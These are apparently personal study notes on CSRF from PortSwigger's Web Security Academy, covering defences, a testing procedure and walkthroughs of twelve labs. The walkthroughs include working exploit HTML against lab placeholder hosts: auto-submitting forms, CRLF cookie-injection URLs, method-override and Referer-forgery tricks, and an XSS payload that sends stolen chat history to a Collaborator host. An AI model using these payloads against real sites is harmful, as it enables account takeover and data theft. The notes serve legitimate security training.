# CSRF Notes — PortSwigger Web Security Academy

---

## WHAT IS CSRF?

Cross-Site Request Forgery (CSRF) tricks a victim's browser into sending an
authenticated request to a target site — without the victim's knowledge.

The attack works because browsers automatically attach cookies to every request
sent to a domain. The target server sees a valid session cookie and treats the
request as legitimate. The attacker never needs to steal the cookie — they just
need the victim's browser to make the request while the cookie is there.

**A simple mental model:**
```
You are logged in to bank.com (session cookie stored in your browser)
You visit evil.com (attacker's page)
evil.com contains a hidden form that POSTs to bank.com/transfer
Your browser sends the form — AND attaches your bank.com session cookie
bank.com processes the transfer as if YOU requested it
```

**Three conditions must all be true for CSRF to work:**
1. The action being targeted is something valuable (change email, transfer money, etc.)
2. The app relies solely on cookies (or HTTP Basic Auth) to identify the user
3. There are no unpredictable parameters the attacker can't guess (e.g. a real CSRF token)

> 📝 CSRF is sometimes called a "confused deputy" attack — the browser is the
> deputy that has the authority (the cookie), and CSRF confuses it into using
> that authority on behalf of the attacker. The browser isn't compromised — it's
> just doing what browsers do: attach cookies to requests automatically.

---

## CSRF vs XSS — KEY DIFFERENCE

| | XSS | CSRF |
|---|---|---|
| **What it does** | Injects and executes malicious code in the victim's browser | Forges a request from the victim's browser |
| **Needs code execution?** | Yes — JS runs in the page | No — just an HTTP request |
| **Needs a cookie?** | No (but can steal one) | No (browser attaches it automatically) |
| **Blocked by CSRF tokens?** | No — XSS can read tokens from the DOM | Yes — if implemented correctly |
| **Blocked by SameSite cookies?** | No | Yes — if set to Strict or Lax |
| **Severity** | Generally higher | Medium-High depending on action |

> 📝 XSS beats CSRF — if you have XSS on a site, you can bypass any CSRF
> protection because your script runs inside the origin and can read CSRF tokens
> directly from the DOM. This is exactly what Lab 16 of the XSS module demonstrated.

---

## DISTINCT CSRF VULNERABILITY TYPES

### 1. No CSRF Protection
- The state-changing endpoint accepts requests with no token, no SameSite, no Referer check.
- A simple auto-submitting HTML form from any domain works.

### 2. Broken Token Validation
Token is present but the validation logic has a flaw:
- **Token not validated at all** — token exists in the form but server doesn't check it
- **Validation depends on request method** — POST checks token, GET does not
- **Validation depends on token being present** — empty/missing token passes validation
- **Token not tied to user session** — a token from account A works against account B
- **Token tied to a non-session cookie** — attacker can set their own cookie and matching token
- **Token duplicated in a cookie** — "double submit" pattern where both values come from attacker

### 3. SameSite Cookie Bypass
SameSite is a cookie attribute that tells the browser when to send the cookie
in cross-site requests. It's the modern CSRF defence — but it has bypass paths:
- **Lax + method override** — Lax allows GET, so override POST to GET with `_method=POST`
- **Strict + client-side redirect** — same-site open redirect carries the request after Strict cookie is attached
- **Strict + sibling domain** — XSS on a subdomain of the same site = same-site context
- **Lax + cookie refresh** — Chrome's 2-minute grace period where new cookies have no SameSite restriction

### 4. Referer-Based Bypass
Some older apps use the HTTP `Referer` header to check where a request came from.
Both common implementations are weak:
- **Referer absent** — if the app only validates when Referer is present, just suppress it
- **Referer contains domain** — app checks if the target domain appears *anywhere* in Referer → forge `https://evil.com/?victim.com`

---

## CSRF DEFENCES (AND HOW THEY FAIL)

### Defence 1 — CSRF Tokens (the gold standard)
A secret, random value tied to the user's session, included in every
state-changing form. Server validates it before acting.

**How it fails:**
- Token not validated server-side at all
- Token validated only on POST, not GET
- Token accepted even when blank
- Token valid for any user (not tied to session)
- Token predictable or short

**What a correct implementation looks like:**
- Unpredictable, high-entropy (cryptographically random)
- Tied strictly to the user's session
- Validated on every state-changing request regardless of method
- Expires with the session

### Defence 2 — SameSite Cookies
A cookie attribute (`SameSite=Strict`, `SameSite=Lax`, `SameSite=None`) that
controls whether the browser sends the cookie on cross-site requests.

| Value | Cross-site POST | Cross-site GET (top-level nav) |
|---|---|---|
| `Strict` | ✘ Not sent | ✘ Not sent |
| `Lax` | ✘ Not sent | ✔ Sent |
| `None` | ✔ Sent | ✔ Sent |

> 📝 Since 2021, Chrome applies `Lax` by default when a site doesn't set SameSite
> at all. This is a big deal — it means a huge number of sites got partial CSRF
> protection without doing anything. But Lax is not Strict — GET-based CSRF still
> works against Lax cookies.

**How it fails:** See bypass types above.

### Defence 3 — Referer Header Validation
App checks the `Referer` header to confirm the request came from the same domain.

**How it fails:**
- Referer can be suppressed (`Referrer-Policy: no-referrer` in a meta tag)
- Substring matching allows forge: `https://evil.com/https://victim.com`
- Some browsers or privacy tools strip Referer automatically

### Defence 4 — SameSite + CSRF Token (combined)
The correct modern approach is both together — SameSite Strict/Lax cookie AND
a CSRF token. This provides defence in depth: even if one is bypassed, the other
still holds.

---

## CSRF TESTING SOP

### Step 1 — Find State-Changing Actions
CSRF only matters for requests that change something:
- Email/password change
- Account settings update
- Money transfer / order placement
- Admin actions (delete user, promote role)
- Any POST/PUT/DELETE that has side effects

GET requests should never change state — if they do, that's an additional bug.

### Step 2 — Identify the Authentication Mechanism
- Does the app use cookies? → CSRF is possible
- Does it use `Authorization: Bearer <token>` headers? → CSRF not applicable (browsers don't send custom headers cross-site automatically)
- Does it use HTTP Basic Auth? → CSRF still possible (browsers send Basic Auth automatically)

### Step 3 — Check for CSRF Token
- Is there a hidden `csrf` field in the form?
- Is there a custom header like `X-CSRF-Token`?
- If no token at all → exploit directly (Lab 01)

### Step 4 — Test Token Validation
If a token exists, test each failure mode:

| Test | How |
|---|---|
| Remove the token entirely | Delete the parameter from the request |
| Send an empty token | `csrf=` |
| Send a random value | `csrf=aaaaaaaaaaaaaaaa` |
| Change request method to GET | Burp Repeater → right-click → Change request method |
| Use your own account's token against victim | Log in as attacker, grab token, use it in exploit |

### Step 5 — Check SameSite Cookie Attribute
- Intercept the login response in Burp
- Look at `Set-Cookie:` header for the session cookie
- Is `SameSite=Strict`, `SameSite=Lax`, `SameSite=None`, or absent?
- Absent = Chrome defaults to Lax (partial protection)

### Step 6 — Check Referer Validation
- Send the state-changing request without a Referer header
- If it works → Referer not required
- Send with a forged Referer containing the target domain as a substring
- If it works → substring check bypass confirmed

### Step 7 — Build the Exploit
Use the appropriate exploit template based on what you found:
- No defence → simple auto-submit form
- GET allowed → `<img src="https://victim.com/action?param=value">`
- POST required → `<form method=POST ...><script>document.forms[0].submit()</script>`
- SameSite bypass needed → method override / redirect / sibling domain / cookie refresh

### Step 8 — Deliver via Exploit Server
PortSwigger provides an "exploit server" in every lab — it's a web server you
control that you can use to host your malicious page and deliver it to the
simulated victim.

---

## QUICK BURP WORKFLOW

1. Log in as `wiener:peter` → perform the target action (e.g. change email)
2. Find the request in **Proxy History** → send to **Repeater** (Ctrl+R)
3. Probe for CSRF weaknesses (remove token, change method, etc.)
4. Right-click → **Engagement tools → Generate CSRF PoC** (Pro feature)
   Or build the HTML form manually (Community Edition)
5. Test the exploit on yourself first via **"View exploit"** on the exploit server
6. Deliver to victim

> 📝 **Generate CSRF PoC** is one of Burp Pro's most useful features. It takes
> any request and automatically generates a working HTML page that replicates it.
> In Community Edition you build the form manually — which is actually better for
> learning because you understand every field.

---
---

## PORTSWIGGER LABS

---

### #01 — CSRF vulnerability with no defences

**URL:** https://portswigger.net/web-security/csrf/lab-no-defenses
**Vulnerability:** Email change endpoint — no CSRF protection whatsoever
**Aim:** Change the victim's email address using a CSRF attack

**Background:**
The simplest possible CSRF scenario. The `/my-account/change-email` endpoint
accepts a POST with just `email=` — no token, no SameSite restriction, no
Referer check. The browser attaches the victim's session cookie automatically.

**Analysis:**
```
POST /my-account/change-email HTTP/1.1
Host: TARGET.web-security-academy.net
Cookie: session=VICTIM_SESSION

email=attacker%40evil.com

→ No csrf= parameter anywhere.
→ Server processes it based purely on the session cookie.
→ Any site can trigger this.
```

**Exploit — auto-submitting HTML form:**
```html
<form method="POST" action="https://TARGET.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit();</script>
```

**Steps:**
1. Log in, intercept the change-email POST, confirm no token
2. Paste the form above into the exploit server Body field (update TARGET)
3. Click Store → View exploit (test on yourself first)
4. Click Deliver exploit to victim

> 📝 The `<script>document.forms[0].submit()</script>` is what makes the form
> submit automatically without the victim having to click anything. The victim
> just needs to load the page. This is the baseline CSRF attack — everything else
> in this module is a variation on this same form, just with different bypass
> techniques layered on top.

---

### #02 — CSRF where token validation depends on request method

**URL:** https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-request-method
**Vulnerability:** Token validated on POST requests only — GET bypasses validation
**Aim:** Change the victim's email address

**Background:**
The app has a CSRF token in the email change form — but the developer made a
mistake: they only validate the token when the request method is POST. If you
switch the request to GET, the token check is skipped entirely.

**Analysis:**
```
POST /my-account/change-email HTTP/1.1
csrf=VALIDTOKEN&email=test@test.com  → 200 OK

POST /my-account/change-email HTTP/1.1
csrf=WRONGTOKEN&email=test@test.com  → 400 Invalid token  ← token IS checked on POST

GET /my-account/change-email?email=test@test.com HTTP/1.1  → 200 OK  ← no check on GET
```

**Exploit — GET request via img or form:**
```html
<form method="GET" action="https://TARGET.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit();</script>
```

> 📝 This is a very common mistake in real apps. Developers add CSRF protection
> to their POST handler but forget that the same endpoint might also accept GET.
> The rule is: CSRF token validation must happen for ALL methods that change
> state, not just POST. In Burp Repeater, right-click → "Change request method"
> to instantly convert POST → GET and test this.

---

### #03 — CSRF where token validation depends on token being present

**URL:** https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-validation-depends-on-token-being-present
**Vulnerability:** Token validated only when present — omitting it skips validation
**Aim:** Change the victim's email address

**Background:**
The server checks the token IF it is submitted. But if the `csrf` parameter is
missing from the request entirely, the server skips validation. This is a logic
flaw: the developer wrote "if token is present and wrong → reject" but forgot
"if token is absent → reject".

**Analysis:**
```
POST /my-account/change-email
csrf=WRONGTOKEN&email=test@test.com  → 400 Invalid token

POST /my-account/change-email
csrf=&email=test@test.com            → 400 Invalid token  (empty but present)

POST /my-account/change-email
email=test@test.com                  → 200 OK  ← no csrf param at all → accepted
```

**Exploit — form without any csrf field:**
```html
<form method="POST" action="https://TARGET.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="attacker@evil.com">
    <!-- Note: no csrf field at all -->
</form>
<script>document.forms[0].submit();</script>
```

> 📝 This is a server-side logic error. The correct implementation should be:
> "If the token is missing OR wrong → reject." Instead it's:
> "If the token is present AND wrong → reject" — which leaves the missing case
> unhandled. When testing CSRF tokens, always try both: sending a wrong value
> AND sending no value at all. They may behave differently.

---

### #04 — CSRF where token is not tied to user session

**URL:** https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-not-tied-to-user-session
**Vulnerability:** CSRF tokens exist in a global pool — not bound to any specific session
**Aim:** Change the victim's email address using your own unused CSRF token

**Background:**
The server generates tokens correctly (random, unpredictable) — but stores them
in a global pool rather than tied to individual sessions. Any valid token from
the pool works for any user. This means you can log in as the attacker, grab a
token, drop the request (don't use the token), then use that token in your
exploit against the victim.

**Analysis:**
```
Attacker logs in → gets csrf=ATTACKER_TOKEN in their form
Attacker drops the request (token is still unused in the pool)

Exploit uses csrf=ATTACKER_TOKEN against victim's session
→ Server checks: is ATTACKER_TOKEN in the pool? Yes → accepts it
→ Victim's email is changed
```

**Steps:**
1. Log in as `wiener:peter`, go to account page, intercept the change-email request
2. Note the CSRF token value → **drop the request** (don't submit — keep it unused)
3. Build the exploit form using your unused token:

```html
<form method="POST" action="https://TARGET.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="attacker@evil.com">
    <input type="hidden" name="csrf" value="YOUR_UNUSED_TOKEN_HERE">
</form>
<script>document.forms[0].submit();</script>
```

> 📝 Tokens must be tied to the user's **session**, not just stored in a global
> list. The correct implementation: when the server generates a token, it stores
> it as `session_id → token`. When validating, it checks `does this token match
> THIS session?` A global pool can't make that check — any token works for any
> session. This is a subtle but critical implementation flaw.

---

### #05 — CSRF where token is tied to non-session cookie

**URL:** https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-tied-to-non-session-cookie
**Vulnerability:** CSRF token tied to a separate cookie (not the session cookie)
**Aim:** Change the victim's email by injecting a cookie into their browser

**Background:**
The app uses two cookies: `session` (the auth cookie) and `csrfKey` (a separate
CSRF key cookie). The CSRF token in the form is tied to `csrfKey`, not to
`session`. This means:
- If you can set the victim's `csrfKey` cookie to a value you control,
  you can supply the matching `csrf` token and it will validate.
- Cookie injection is possible via a separate vulnerability: the search
  parameter reflects a `Set-Cookie` header, letting you inject a cookie
  into the victim's browser.

**Analysis:**
```
Normal flow:
  Cookie: session=VICTIM_SESSION; csrfKey=VICTIM_CSRFKEY
  Body: email=new@email.com&csrf=TOKEN_MATCHING_VICTIM_CSRFKEY

Attack flow:
  1. Attacker logs in → gets their own csrfKey=ATTACKER_CSRFKEY and matching csrf=ATTACKER_TOKEN
  2. Attacker injects csrfKey=ATTACKER_CSRFKEY into victim's browser via search cookie injection
  3. Exploit submits csrf=ATTACKER_TOKEN → server checks against ATTACKER_CSRFKEY → matches → accepted
```

**Cookie injection via search parameter:**
```
/?search=anything%0d%0aSet-Cookie:+csrfKey=ATTACKER_CSRFKEY%3b+SameSite=None
```
`%0d%0a` = CRLF (`\r\n`) — injects a new line into the response header,
adding a `Set-Cookie` header that plants your `csrfKey` in the victim's browser.

**Full exploit:**
```html
<!-- Step 1: inject attacker's csrfKey cookie into victim's browser -->
<img src="https://TARGET.web-security-academy.net/?search=x%0d%0aSet-Cookie:+csrfKey=ATTACKER_CSRFKEY%3b+SameSite=None" onerror="document.forms[0].submit()">

<!-- Step 2: submit the form with attacker's matching csrf token -->
<form method="POST" action="https://TARGET.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="attacker@evil.com">
    <input type="hidden" name="csrf" value="ATTACKER_TOKEN">
</form>
```

> 📝 **CRLF injection** (`\r\n` = `%0d%0a`) lets you inject new HTTP response
> headers when user input is reflected unsanitised into a response header value.
> This is a separate vulnerability class (HTTP response header injection) being
> chained here. The `onerror` on the img fires after the cookie is set, then
> submits the form. This lab shows how two weaker vulnerabilities can chain into
> a critical one.

---

### #06 — CSRF where token is duplicated in a cookie

**URL:** https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-duplicated-in-cookie
**Vulnerability:** "Double submit cookie" pattern — token in cookie matches token in body
**Aim:** Change the victim's email by setting both cookie and body token to your own value

**Background:**
The "double submit cookie" pattern is a common simplified CSRF defence:
- Set a `csrf` cookie with a random value
- Include the same value as a hidden form field
- Server checks: does `cookie.csrf == body.csrf`?

This seems clever — an attacker can't read the cookie due to same-origin policy.
But if there's a way to **set** a cookie on the victim's browser (via CRLF
injection, a subdomain, etc.), the attacker can set both to the same value and
bypass the check.

**Analysis:**
```
Legitimate request:
  Cookie: session=VICTIM; csrf=RANDOM123
  Body: email=victim@email.com&csrf=RANDOM123
  Server checks: cookie.csrf == body.csrf → "RANDOM123" == "RANDOM123" → OK

Attack:
  Inject Cookie: csrf=fake123 into victim's browser
  Submit Body: csrf=fake123
  Server checks: "fake123" == "fake123" → OK  (server never validates AGAINST a session)
```

**Exploit (same CRLF cookie injection as Lab 05):**
```html
<img src="https://TARGET.web-security-academy.net/?search=x%0d%0aSet-Cookie:+csrf=fake123%3b+SameSite=None" onerror="document.forms[0].submit()">

<form method="POST" action="https://TARGET.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="attacker@evil.com">
    <input type="hidden" name="csrf" value="fake123">
</form>
```

> 📝 The double-submit pattern looks clever but has a fundamental flaw: it
> verifies consistency (do these two values match?) but not authenticity (did
> the SERVER generate this value for THIS session?). If an attacker can control
> either copy, they control both. A real CSRF token must be generated by the
> server, tied to the session, and never user-settable.

---

### #07 — SameSite Lax bypass via method override

**URL:** https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-lax-bypass-via-method-override
**Vulnerability:** Session cookie has no SameSite attribute (defaults to Lax) — GET requests allowed cross-site
**Aim:** Change the victim's email using a GET-based CSRF

**Background:**
SameSite=Lax (the Chrome default when not set) allows cookies on cross-site
requests IF:
1. The method is GET
2. It's a top-level navigation (not a background fetch/XHR)

The email change endpoint only accepts POST. But the framework supports
`_method` query parameter to override the HTTP method server-side. So a GET
request with `_method=POST` is treated as POST by the server — but the browser
sends the Lax cookie because it sees it as a GET.

**Analysis:**
```
POST /my-account/change-email → requires POST, Lax cookie not sent cross-site

GET /my-account/change-email?email=x&_method=POST → server treats as POST
  → browser sees GET → Lax cookie IS sent cross-site
  → email changes
```

**Exploit:**
```html
<script>
document.location = 'https://TARGET.web-security-academy.net/my-account/change-email?email=attacker%40evil.com&_method=POST';
</script>
```

Using `document.location` makes it a top-level navigation → Lax cookies are sent.

> 📝 SameSite=Lax protects against cross-site POST but not cross-site GET. The
> `_method` override is a convention used by many web frameworks (Rails, Laravel,
> Django) to allow HTML forms (which only support GET/POST) to send PUT/DELETE
> — but it works in both directions. If a server supports `_method=POST` on a
> GET request, Lax is ineffective. Always check if the target framework supports
> method override parameters.

---

### #08 — SameSite Strict bypass via client-side redirect

**URL:** https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-client-side-redirect
**Vulnerability:** SameSite=Strict cookie, but a same-site open redirect exists
**Aim:** Chain the redirect with a CSRF attack to change the victim's email

**Background:**
SameSite=Strict means the cookie is never sent on cross-site requests — at all.
This seems bulletproof, but: if the attacker can make the victim's browser
navigate to a URL on the TARGET SITE that then redirects to the CSRF endpoint,
the second request is same-site (it originated from the target site itself).

The blog comment confirmation page at `/post/comment/confirmation?postId=x`
redirects the user back to the blog post using `postId` in a client-side JS
redirect. The `postId` value is used unsanitised to construct the redirect path:
```javascript
// commentConfirmationRedirect.js
redirectOnConfirmation = (blogPath) => {
    setTimeout(() => {
        const url = new URL(window.location);
        const postId = url.searchParams.get("postId");
        window.location = blogPath + postId;  // ← postId injected into path
    }, 3000);
}
```

Inject a path traversal into `postId` to redirect to `/my-account/change-email`:
```
postId=1/../../my-account/change-email?email=attacker@evil.com
```

**Exploit:**
```html
<script>
document.location = "https://TARGET.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=attacker%40evil.com&submit=1";
</script>
```

The victim's browser goes to TARGET.web-security-academy.net → that page
redirects them to the change-email endpoint → it's same-site all the way →
Strict cookies are sent → email changed.

> 📝 SameSite=Strict only controls the FIRST cross-site request. Once the
> victim's browser is on the target domain (even via a redirect), subsequent
> same-site navigation carries the Strict cookie normally. An open redirect or
> path injection on the target site itself breaks Strict protection. This is why
> CSRF tokens remain necessary even WITH SameSite=Strict — defence in depth.

---

### #09 — SameSite Strict bypass via sibling domain

**URL:** https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-sibling-domain
**Vulnerability:** SameSite=Strict, but a sibling subdomain has reflected XSS
**Aim:** Chain XSS on the sibling domain with CSRF to exfiltrate victim's chat history

**Background:**
SameSite is determined by the **site** (registrable domain), not the **origin**
(scheme+domain+port). So `cms-TARGET.web-security-academy.net` is the SAME SITE
as `TARGET.web-security-academy.net` — requests between them carry Strict cookies.

The main site has a live chat feature (WebSocket) and SameSite=Strict protection.
A sibling domain `cms-TARGET` has a reflected XSS via the username field on its
login form. Injecting XSS on the sibling domain → code runs in the same-site
context → WebSocket connection to the main site carries the Strict cookie →
chat history is exfiltrated to Burp Collaborator.

**Attack chain:**
```
1. Deliver exploit → victim visits evil.com
2. evil.com iframe loads cms-TARGET/login?username=XSS_PAYLOAD
3. XSS runs on cms-TARGET (same site as TARGET)
4. XSS opens WebSocket to TARGET/chat → sends READY
5. Server returns full chat history (including credentials)
6. XSS exfiltrates history to Burp Collaborator
```

**XSS payload (URL-encoded, injected as username):**
```javascript
<script>
var ws = new WebSocket('wss://TARGET.web-security-academy.net/chat');
ws.onopen = () => ws.send("READY");
ws.onmessage = (e) => fetch('https://COLLABORATOR.NET', {method:'POST', mode:'no-cors', body:e.data});
</script>
```

**Exploit server delivery:**
```html
<iframe src="https://cms-TARGET.web-security-academy.net/login?username=XSS_PAYLOAD_URL_ENCODED&password=x&csrf=YOUR_CSRF_TOKEN"></iframe>
```

> 📝 This lab introduces **Cross-Site WebSocket Hijacking (CSWSH)** — a CSRF
> variant targeting WebSocket connections. WebSockets don't follow the same CORS
> rules as HTTP — the browser sends cookies when opening a WebSocket connection
> to a domain, so if the server doesn't validate the origin, an attacker can
> hijack it. The sibling domain XSS is the key — it moves the attack from
> cross-site to same-site, bypassing Strict.

---

### #10 — SameSite Lax bypass via cookie refresh

**URL:** https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-cookie-refresh
**Vulnerability:** OAuth login issues cookies without SameSite — Chrome's 2-minute Lax grace period applies
**Aim:** Force a cookie refresh during the attack to exploit the grace period

**Background:**
When Chrome applies Lax by default to a cookie without an explicit SameSite
attribute, it adds a 2-minute grace period after the cookie is first set, during
which the cookie behaves as if it has NO SameSite restriction at all. This allows
OAuth flows (which involve cross-site redirects) to work with the newly issued
session cookie.

The attack exploits this: force the victim to refresh their session cookie (via
an OAuth flow popup), then immediately fire the CSRF payload before the 2-minute
window expires.

**Attack flow:**
```
1. Exploit page opens a popup to /social-login (triggers OAuth → sets fresh cookie)
2. After 5-second delay (cookie is new → grace period active), CSRF payload fires
3. CSRF POST request carries the new cookie (no SameSite restriction yet)
4. Email changed
```

**Exploit:**
```html
<script>
    window.onclick = () => {
        window.open('https://TARGET.web-security-academy.net/social-login');
        setTimeout(submitForm, 5000);
    }

    function submitForm() {
        var form = document.createElement('form');
        form.method = 'POST';
        form.action = 'https://TARGET.web-security-academy.net/my-account/change-email';
        var email = document.createElement('input');
        email.name = 'email';
        email.value = 'attacker@evil.com';
        form.appendChild(email);
        document.body.appendChild(form);
        form.submit();
    }
</script>
<p>Click anywhere on the page</p>
```

The victim click is needed to open the popup without it being blocked by the
browser's popup blocker.

> 📝 Chrome's 2-minute Lax grace period exists for a practical reason — OAuth
> and SSO flows involve cross-site redirects that set session cookies, and those
> cookies need to work immediately on cross-site requests (the OAuth callback).
> The grace period makes OAuth viable with Lax. But it creates this bypass
> window. The fix is to explicitly set `SameSite=Lax` on the cookie — the grace
> period only applies to cookies without any SameSite attribute set.

---

### #11 — CSRF where Referer validation depends on header being present

**URL:** https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-depends-on-header-being-present
**Vulnerability:** Referer checked only when present — suppress it to bypass
**Aim:** Change victim's email by making the request without a Referer header

**Background:**
The app validates the `Referer` header to confirm requests originate from the
same domain. But the logic is: "IF Referer is present AND doesn't match → reject."
It doesn't handle the case where Referer is absent — absent = accepted.

To suppress the Referer header from your exploit page, add a `<meta>` tag:
```html
<meta name="referrer" content="no-referrer">
```
This tells the browser not to send a Referer header with any requests from the
page.

**Exploit:**
```html
<meta name="referrer" content="no-referrer">
<form method="POST" action="https://TARGET.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>document.forms[0].submit();</script>
```

> 📝 The `Referrer-Policy` meta tag (note the double-r spelling in the HTML
> attribute but single-r in the HTTP header — yes, it's inconsistent) controls
> what the browser sends in the `Referer` header. `no-referrer` suppresses it
> entirely. This is a legitimate browser privacy feature that CSRF attackers can
> abuse. Referer-based CSRF protection is inherently weak because the Referer
> can be suppressed, forged (to some extent), or stripped by intermediaries.

---

### #12 — CSRF with broken Referer validation

**URL:** https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-broken
**Vulnerability:** Referer validation checks if the target domain appears anywhere in the Referer value
**Aim:** Forge a Referer that contains the target domain to bypass validation

**Background:**
The server checks if the Referer header *contains* the target domain as a
substring — not if it matches exactly as the origin. This can be bypassed by
crafting a URL where the target domain appears in the query string:

```
Referer: https://evil.com/?TARGET.web-security-academy.net
          ↑ attacker domain                ↑ target domain in query string
```

The substring check passes because `TARGET.web-security-academy.net` is
present in the Referer — but the actual origin is `evil.com`.

To make the browser include a specific Referer containing our controlled string,
we need to allow it (some browsers suppress query strings in Referer by default):

```html
<!-- Allow full Referer including query string -->
<meta name="referrer" content="unsafe-url">
```

**Exploit:**
```html
<meta name="referrer" content="unsafe-url">
<form method="POST" action="https://TARGET.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="attacker@evil.com">
</form>
<script>
    // History manipulation to put the target domain in our URL's query string
    history.pushState('', '', '/?TARGET.web-security-academy.net');
    document.forms[0].submit();
</script>
```

`history.pushState` changes the browser's current URL (without navigating),
which changes what gets sent as the `Referer` on the next request.

> 📝 Referer validation must check the Referer's **origin** exactly — not whether
> the expected domain appears anywhere in the string. A check like
> `if (referer.includes("victim.com"))` is trivially bypassed by
> `https://evil.com/?victim.com`. The correct check is:
> `new URL(referer).origin === "https://victim.com"`. Substring matching for
> security is almost always wrong.

---

## REFERENCE — CSRF TOKEN VALIDATION FLAWS

| Flaw | Test |
|---|---|
| No token at all | Inspect the form — no csrf field |
| Token not validated | Change token value → still works |
| Validated on POST only | Convert to GET → works |
| Accepted when absent | Remove csrf param → works |
| Accepted when empty | Set csrf= (empty) → works |
| Not tied to session | Use your own token in exploit → works |
| Tied to non-session cookie | Inject your csrfKey cookie → works |
| Double-submit pattern | Inject same value into cookie + body → works |

---

## REFERENCE — SAMESITE BYPASS CONDITIONS

| Cookie SameSite | Cross-site GET | Cross-site POST | Bypass technique |
|---|---|---|---|
| `None` | ✔ Sent | ✔ Sent | No bypass needed |
| `Lax` (explicit) | ✔ Top-level nav | ✘ Not sent | Method override, GET endpoint |
| `Lax` (default/implicit) | ✔ Top-level nav | ✘ Not sent | Same + 2-min grace period bypass |
| `Strict` | ✘ Not sent | ✘ Not sent | Sibling domain XSS, client-side redirect |
| Absent (non-Chrome) | ✔ Sent | ✔ Sent | No bypass needed |

---

## REFERENCE — CSRF EXPLOIT TEMPLATES

**Basic POST CSRF (no defences):**
```html
<form method="POST" action="https://TARGET/endpoint">
    <input type="hidden" name="param" value="value">
</form>
<script>document.forms[0].submit();</script>
```

**GET-based CSRF (method bypass or Lax):**
```html
<script>document.location = 'https://TARGET/endpoint?param=value';</script>
```

**Suppress Referer:**
```html
<meta name="referrer" content="no-referrer">
```

**Forge Referer substring:**
```html
<meta name="referrer" content="unsafe-url">
<script>history.pushState('','','/?TARGET.web-security-academy.net');</script>
```

**CRLF cookie injection (for Labs 05 and 06):**
```
https://TARGET/?search=x%0d%0aSet-Cookie:+csrf=fake123%3b+SameSite=None
```

**SameSite Lax via method override:**
```html
<script>document.location = 'https://TARGET/endpoint?param=value&_method=POST';</script>
```
